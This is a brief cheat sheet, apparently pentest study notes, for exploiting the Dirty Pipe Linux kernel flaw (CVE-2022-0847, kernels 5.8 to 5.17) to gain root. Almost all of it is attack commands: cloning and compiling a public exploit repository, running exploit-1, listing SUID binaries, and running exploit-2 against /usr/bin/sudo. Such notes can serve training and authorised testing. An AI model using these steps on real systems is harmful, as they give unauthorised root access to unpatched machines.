Vulnerability in the Linux kernel
- CVE-2022-0847
- Kernel versions 5.8 - 5.17

**Dirty Pipe
```shell-session
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```

**Verify Kernel Version
```shell-session
uname -r
```
**Exploitation 1
```shell-session
./exploit-1
```

**Find SUID Binaries
```shell-session
find / -perm -4000 2>/dev/null
```

**Exploitation
```shell-session
./exploit-2 /usr/bin/sudo
```
